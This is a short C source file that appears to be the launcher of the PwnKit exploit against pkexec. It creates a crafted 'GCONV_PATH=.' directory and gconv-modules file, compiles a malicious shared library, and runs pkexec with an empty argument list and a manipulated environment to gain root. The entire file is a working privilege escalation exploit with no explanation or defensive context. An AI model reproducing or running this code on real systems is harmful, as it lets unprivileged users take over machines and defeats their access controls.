#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int agrc, char *argv[])
{
    printf("[+] compiling pwnkit...");
    pid_t id;
    system("mkdir -p 'GCONV_PATH=.' && touch 'GCONV_PATH=./pwnkit' && chmod a+x 'GCONV_PATH=./pwnkit'");
    system("mkdir -p pwnkit ");
    system("echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
    system("gcc pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
    char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
    printf("working");
    execve("/usr/bin/pkexec", NULL, env);
    return 0;
}
